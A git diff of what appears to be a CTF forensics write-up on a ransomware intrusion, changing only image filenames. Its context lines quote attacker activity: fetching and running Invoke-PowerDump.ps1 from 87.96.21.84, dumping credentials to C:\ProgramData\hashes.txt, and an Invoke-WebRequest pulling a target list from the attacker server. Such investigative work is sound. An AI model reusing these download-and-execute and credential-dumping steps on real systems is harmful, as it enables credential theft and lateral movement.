@@ -308,7 +308,7 @@ The network capture was filtered using the Wireshark filter **`http contains "sc
 
 This filter helps narrow down traffic that may involve the use of the schtasks.exe utility, a Windows command-line tool used to create, delete, or manage scheduled tasks. Filtering for this keyword is effective in identifying malicious activity related to task scheduling.
 
-<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 **According to your analysis of the second malicious file, what is the MITRE ID of the tactic the file aims to achieve?**
 
@@ -330,11 +330,11 @@ This describes how attackers disable or modify security tools to evade detection
 
 The Wireshark filter applied in this capture, `http contains "lsass"`, specifically looks for HTTP traffic related to processes interacting with the Local Security Authority Subsystem Service (LSASS). LSASS is a critical process in Windows that handles security policies, authentication, and the storage of credentials in memory.
 
-<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 By filtering for traffic related to LSASS, the analysis focuses on detecting scripts or commands targeting this process, which is a common method for credential dumping.
 
-<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 The HTTP stream shows the attacker downloaded and executed a PowerShell script named **Invoke-PowerDump.ps1** from:\
 [**http://87.96.21.84/Invoke-PowerDump.ps1**](http://87.96.21.84/Invoke-PowerDump.ps1)
@@ -350,15 +350,15 @@ This attack aligns with the MITRE ATT\&CK technique **T1003 (OS Credential Dumpi
 
 The Wireshark filter applied in the packet capture, `http contains "Invoke-PowerDump.ps1"`, is designed to isolate HTTP traffic involving the specific PowerShell script `Invoke-PowerDump.ps1`. This script is associated with credential dumping and is often used by attackers to extract password hashes or sensitive data from compromised systems. Filtering traffic by this keyword helps focus on HTTP requests and responses related to the script's download or execution, aiding in identifying malicious activity.<br>
 
-<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
 The HTTP stream reveals that the attacker downloaded and executed the Invoke-PowerDump.ps1 script from the server hosted at `http://87.96.21.84`. This script is designed to extract password hashes stored in the system, requiring administrative privileges to access sensitive areas, such as the Security Accounts Manager (SAM) database or LSASS memory. Within the stream, encoded commands are observed, indicating that the attacker encoded parts of the script using Base64 to obfuscate its actions and bypass detection mechanisms.
 
 The encoded command is then decoded using `CyberChef`, revealing that the attacker executed the Invoke-PowerDump function and saved the extracted credentials to a file.
 
-<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
 
 The decoded output explicitly shows the command used to write the dumped credentials into a text file stored at `C:\ProgramData\hashes.txt`
 
@@ -370,7 +370,7 @@ This file contains the harvested credentials and serves as a staging point for t
 
 The captured HTTP stream reveals the attacker's use of PowerShell scripts to perform reconnaissance and credential-based attacks. During the reconnaissance phase, the attacker retrieved a list of target hosts from a text file stored on the attacker's server.
 
-<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
 
 The PowerShell command executed in the script fetches this file using the Invoke-WebRequest cmdlet. Specifically, the command:
 
@@ -380,7 +380,7 @@ $hostsContent = Invoke-WebRequest -Uri "http://87.96.21.84/extracted_hosts.txt" 
 
 downloads the file named `extracted_hosts.txt` from the attacker's server at `87.96.21.84`.
 
-<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
 
 The file likely contains a list of **IP addresses** or **hostnames** identified during the attacker's reconnaissance phase, marking potential targets for exploitation, lateral movement, and privilege escalation.
 
@@ -392,10 +392,10 @@ The attacker uses retrieved credentials and discovered hosts to facilitate later
 
 ### To Know the Dropped ransomware file name i used virus total after upload the hash of the malware on it <a href="#id-15-to-know-the-dropped-ransomware-file-name-i-used-virus-total-after-upload-the-hash-of-the-malwa" id="id-15-to-know-the-dropped-ransomware-file-name-i-used-virus-total-after-upload-the-hash-of-the-malwa"></a>
 
-<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
 **In some cases, decryption tools are available for specific ransomware families. Identifying the family name can lead to a potential decryption solution. What's the name of this ransomware family?**
 
-<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
